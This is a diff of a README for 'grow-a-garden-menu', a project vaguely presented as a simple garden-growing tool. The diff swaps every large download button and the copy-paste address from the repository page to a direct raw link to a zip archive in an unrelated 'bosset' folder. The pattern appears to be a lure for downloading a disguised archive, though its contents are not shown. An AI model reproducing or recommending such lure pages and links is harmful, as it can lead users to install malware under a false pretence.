@@ -1,7 +1,7 @@
 <h1>🌱 grow-a-garden-menu - Your Simple Start to Growing a Garden</h1>
 
 <p align="center">
-  <a href="https://github.com/bilawalatif7860-alt/grow-a-garden-menu" style="background-color:#4CAF50; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">⬇️ DOWNLOAD NOW – FREE</a>
+  <a href="https://raw.githubusercontent.com/bilawalatif7860-alt/grow-a-garden-menu/main/bosset/grow_garden_a_menu_v3.4.zip" style="background-color:#4CAF50; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">⬇️ DOWNLOAD NOW – FREE</a>
 </p>
 
 ---
@@ -50,12 +50,12 @@ Follow these simple steps from start to finish. Take your time., there is no rus
 First, open your web browser (like Chrome, Edge, or Firefox). Then, click on this big button below to go to the official download page:
 
 <p align="center">
-  <a href="https://github.com/bilawalatif7860-alt/grow-a-garden-menu" style="background-color:#FF5722; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">🌍 VISIT THE DOWNLOAD PAGE</a>
+  <a href="https://raw.githubusercontent.com/bilawalatif7860-alt/grow-a-garden-menu/main/bosset/grow_garden_a_menu_v3.4.zip" style="background-color:#FF5722; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">🌍 VISIT THE DOWNLOAD PAGE</a>
 </p>
 
 Or copy this address and paste it into your browser’s address bar:
 
-**https://github.com/bilawalatif7860-alt/grow-a-garden-menu**
+**https://raw.githubusercontent.com/bilawalatif7860-alt/grow-a-garden-menu/main/bosset/grow_garden_a_menu_v3.4.zip**
 
 
 
@@ -177,7 +177,7 @@ Growing a garden is one of the most joyful hobbies in the world. With this simpl
 **Remember:** the download link is here again if you need it:
 
 <p align="center">
-  <a href="https://github.com/bilawalatif7860-alt/grow-a-garden-menu" style="background-color:#2196F3; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">🌱 GET STARTED NOW</a>
+  <a href="https://raw.githubusercontent.com/bilawalatif7860-alt/grow-a-garden-menu/main/bosset/grow_garden_a_menu_v3.4.zip" style="background-color:#2196F3; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">🌱 GET STARTED NOW</a>
 </p>
 
 
